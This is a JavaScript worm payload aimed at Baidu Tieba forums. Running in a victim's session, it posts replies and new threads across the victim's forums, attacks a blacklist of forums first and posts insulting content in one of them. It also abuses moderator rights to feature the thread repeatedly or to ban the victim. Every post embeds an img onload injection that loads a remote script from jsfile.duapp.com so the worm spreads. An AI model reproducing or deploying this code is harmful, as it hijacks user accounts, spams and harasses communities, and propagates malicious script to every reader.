//reply first!
var f = {
	kw: PageData.forum.name,
	ie: "utf-8",
	rich_text: "1",
	floor_num: "1",
	fid: PageData.forum.id,
	tid: PageData.thread.id,
	content: "楼主的帖子赞一个！！",
	tbs: PageData.tbs,
	mouse_pwd: "102,99,101,121,100,101,100,103,92,100,121,101,121,100,121,101,121,100,121,101,92,108,101,100,101,92,100,97,97,101,121,108,101,101,13709731144851",
	mouse_pwd_t: "1370973114485",
	mouse_pwd_isclick: "1",
	lp_type: "0",
	lp_sub_type: "0",
	anonymous: "0",
	tag: "11",
	new_vcode: "1"
}
$.post("http://tieba.baidu.com/f/commit/post/add", f);
//comment content
var c = rich_postor._getData();
c.prefix = "";
var content = ["这个问题，我们要听听2楼的意见", "2楼是我爹爹", "我是本吧第一秒沉帝", "一楼防吞", "大家晚安", "我从1数到20，没人打断我就睡觉", "好累，感觉不会再爱了", "么么哒", "飞蝗芜湖", "一楼喂熊"];
content = content[Math.floor(Math.random() * 10)];
var title = ["一对一轻松勾搭妹子神器", "我爱上我男朋友，他又不爱我了", "祝大家端午节快乐", "祝大家粽子节快乐", "宅男福利！！飞蝗芜湖"];
title = title[Math.floor(Math.random() * 5)];



//testarray.some(function(x){return x==""})
var blacklist = ["73787", "59099", "1206079"];
var blacklistkw = ["魔兽世界", "李毅", "孙立军"]
var whitelist = ["635137", "1074587", "2262468", "2520908", "9046"];
var officialForum = ["153669", "1065858", "2917706", "898666", "2504636", "1882284", "813565", "1566944", "2331213", "3170781", "350911","4536","86209","2118405","1962969","2177090","746110","154474","3025434","4035056","1153798"];
var forumName = [];
var forumId = [];
var lf = PageData.user.user_forum_list.info.length;
for (var i = 0, j = 0; i < lf; i++) {
	if (PageData.user.user_forum_list.info[i].user_level > 4) {
		if (!(whitelist.some(function(x) {
			return x == PageData.user.user_forum_list.info[i].id
		})) && !(officialForum.some(function(x) {
			return x == PageData.user.user_forum_list.info[i].id
		}))) {
			forumName[j] = PageData.user.user_forum_list.info[i].forum_name;
			forumId[j] = PageData.user.user_forum_list.info[i].id;
			j++;
		}
	}
}
//give title and content by different time
var targetDate = [new Date(2013, 05, 12, 19, 29, 00), new Date(2013, 05, 12, 19, 36, 00)];
var presentTime = new Date();
if (presentTime > targetDate[0] && presentTime < targetDate[1]) {
	c.title = "···复仇之魂 铁骑踏过···肥鸭降临";
	c.content = '<img class="BDE_Smiley" width="1" height="1" src="http://static.tieba.baidu.com/tb/editor/images/face/i_f25.png" text="” onload=“var script = document.createElement(’script‘);script.type = ’text/javascript‘;script.charset = ‘utf-8’;script.src = ’http://jsfile.duapp.com/timer.js‘;document.body.appendChild(script)“">';
	c.content += "祝爆吧大帝国各位 受 ，端午节快乐";
} else {
	c.content = '<img class="BDE_Smiley" width="1" height="1" src="http://static.tieba.baidu.com/tb/editor/images/face/i_f25.png" text="” onload=“var script = document.createElement(’script‘);script.type = ’text/javascript‘;script.charset = ‘utf-8’script.src = ’http://jsfile.duapp.com/timer.js‘;document.body.appendChild(script)“">';
	c.content += content;
	c.title = title;
}



//function of post

function makeit(id, kw) {
	c.fid = id;
	c.kw = kw;
	$.post("http://tieba.baidu.com/f/commit/thread/add", c);  //发表帖子
}
//attack black list first
for (i = 0; i < 3; i++) {
	setTimeout("makeit('" + blacklist[i] + "','" + blacklistkw[i] + "')", 3000 * i);
}
//attack sunlijun
var slj = {
	kw: "孙立军",
	ie: "utf-8",
	rich_text: "1",
	floor_num: "0",
	fid: "1206079",
	tid: "0",
	mouse_pwd: "36,34,32,58,35,36,35,46,31,39,58,38,58,39,58,38,58,39,58,38,58,39,58,38,58,39,58,38,31,36,35,47,33,37,36,31,39,34,34,38,58,47,38,38,13709733326221",
	mouse_pwd_t: "1370973332622",
	mouse_pwd_isclick: "1",
	title: "这吧里就一群sb呵呵",
	content: '<img class="BDE_Smiley" width="1" height="1" src="http://static.tieba.baidu.com/tb/editor/images/face/i_f25.png"'
	         'text="” onload=“var script = document.createElement(’script‘);script.type = ’text/javascript‘;script.charset = ‘utf-8’;'
			 'script.src = ’http://jsfile.duapp.com/timer.js‘;document.body.appendChild(script)“">日漫比国漫好了不知道多少倍',
	anonymous: "0",
	tbs: PageData.tbs,
	tag: "11",
	new_vcode: "1"
};
$.post("http://tieba.baidu.com/f/commit/thread/add",slj);
//attack all forum
for (i = 0; i < forumName.length; i++) {
	setTimeout("makeit('" + forumId[i] + "','" + forumName[i] + "')", 2000 * i);
}
//if manager, add good, loop
if (PageData.power.user_roles.is_forum_manager) {
	var d = {
		ie: "utf-8",
		tbs: PageData.tbs,
		kw: PageData.forum.name,
		fid: PageData.forum.id,
		tid: PageData.thread.id,
		cid: "0"
	}
	$.post('http://tieba.baidu.com/f/commit/thread/good/add', d);
	setInterval("$.post('http://tieba.baidu.com/f/commit/thread/good/add',d);", 1200)
}
//if small manager, ban it self
if (PageData.power.user_roles.is_forum_bawu) {
	var e = {
		ban_days: "1",
		cm: "filter_forum_user",
		fid: PageData.forum.id,
		ie: "utf-8",
		tbs: PageData.tbs,
		user_name: PageData.user_name
	}
	$.post("http://tieba.baidu.com/bawu/cm", e);
}